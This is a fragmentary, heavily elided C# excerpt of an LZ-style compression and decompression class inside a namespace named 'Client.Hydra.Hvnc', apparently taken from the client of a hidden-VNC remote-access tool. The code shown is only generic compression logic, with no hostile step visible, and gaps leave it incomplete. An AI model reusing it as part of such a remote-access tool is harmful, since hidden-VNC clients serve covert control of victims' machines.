...
namespace Client.Hydra.Hvnc
{
	public static class Copikolo
	{
		...
		public static byte[] compress(byte[] source, int level)
		{
			...
			while (i <= num4)
			{
				if ((num2 & 1) == 1)
				{
					if (i > source.Length >> 1 && num > i - (i >> 5))
					{
						...
						Copikolo.write_header(array5, level, compressible: false, source.Length, source.Length + 9);
						Array.Copy(source, 0, array5, 9, source.Length);
						return array5;
					}
					Copikolo.fast_write(array, i2, (int)(num2 >> 1) | int.MinValue, 4);
					i2 = num;
					num += 4;
					num2 = 2147483648u;
				}
				...
				if (num16 >= 3 && i - num18 < 131071)
				{
					...
					if (num16 == 3 && num19 <= 63)
					{
						Copikolo.fast_write(array, num, num19 << 2, 1);
						num++;
					}
					else if (num16 == 3 && num19 <= 16383)
					{
						Copikolo.fast_write(array, num, (num19 << 2) | 1, 2);
						num += 2;
					}
					else if (num16 <= 18 && num19 <= 1023)
					{
						Copikolo.fast_write(array, num, (num16 - 3 << 2) | (num19 << 6) | 2, 2);
						num += 2;
					}
					else if (num16 <= 33)
					{
						Copikolo.fast_write(array, num, (num16 - 2 << 2) | (num19 << 7) | 3, 3);
						num += 3;
					}
					else
					{
						Copikolo.fast_write(array, num, (num16 - 3 << 7) | (num19 << 15) | 3, 4);
						num += 4;
					}
					num5 = 0;
				}
			...
			Copikolo.fast_write(array, i2, (int)(num2 >> 1) | int.MinValue, 4);
			Copikolo.write_header(array, level, compressible: true, source.Length, num);
			array5 = new byte[num];
		...
		public static byte[] decompress(byte[] source)
		{
			...
			while (true)
			{
				...
				if ((num4 & 1) == 1)
				{
					...
					if (num8 == 1)
					{
						num9 = (uint)array2[((int)num7 >> 4) & 0xFFF];
						if ((num7 & 0xFu) != 0)
						{
							num10 = (num7 & 0xF) + 2;
							num2 += 2;
					...
					else
					{
						...
						num9 = (uint)(num3 - num11);
					}
					array[num3] = array[num9];
					array[num3 + 1] = array[num9 + 1];
					array[num3 + 2] = array[num9 + 2];
					for (int i = 3; i < num10; i++)
					{
						array[num3 + i] = array[num9 + i];
					}
					num3 += (int)num10;
					if (num8 == 1)
					{
				...
				if (num8 == 1)
				{
					while (num6 < num3 - 3)
					{
						...
						int num14 = ((num13 >> 12) ^ num13) & 0xFFF;
						array2[num14] = num6;
						array3[num14] = 1;
					}
